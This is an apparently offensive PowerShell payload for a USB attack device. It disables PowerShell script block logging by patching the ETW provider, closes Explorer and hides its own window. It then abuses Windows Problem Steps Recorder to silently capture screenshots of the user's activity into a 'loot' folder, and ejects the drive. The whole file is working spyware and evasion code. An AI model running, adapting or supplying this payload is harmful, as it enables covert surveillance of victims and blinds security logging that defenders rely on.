#
# Author:       TW-D
# Version:      1.0
#

Param (
    [String] $BB_VOLUME,
    [Int] $RECORDER_TIME
)

# Partially avoids "PowerShell Script Block Logging".
#
$etw_provider = [Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Static")
$event_provider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etw_provider.SetValue($null, $event_provider)

# Closing of all windows.
#
Get-Process -Name "explorer" | Stop-Process
    
# Hide "PowerShell" window.
#
$Script:showWindowAsync = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null

If ((Test-Path -Path "C:\Windows\System32\psr.exe")) {

    $bb_loot = "${BB_VOLUME}loot\"
    $computer_name = $env:COMPUTERNAME
    
    # Abuse of "Windows Problem Steps Recorder" to spy on a user's activities.
    #
    (C:\Windows\System32\psr.exe /start /sc 1 /maxsc 999 /gui 0 /sketch 1 /slides 1 /output "${bb_loot}${computer_name}_record.zip") | Out-Null
    Start-Sleep -Seconds $RECORDER_TIME
    (C:\Windows\System32\psr.exe /stop) | Out-Null

}

"Win_ProblemStepsRecorder terminated." | Out-File -FilePath .\..\..\loot\done.txt -Force

# Writes the file system cache to disk.
#
Write-VolumeCache -DriveLetter ("${BB_VOLUME}".Substring(0,1))

# Safely eject.
#
(New-Object -ComObject Shell.Application).Namespace(17).ParseName("${BB_VOLUME}").InvokeVerb("Eject")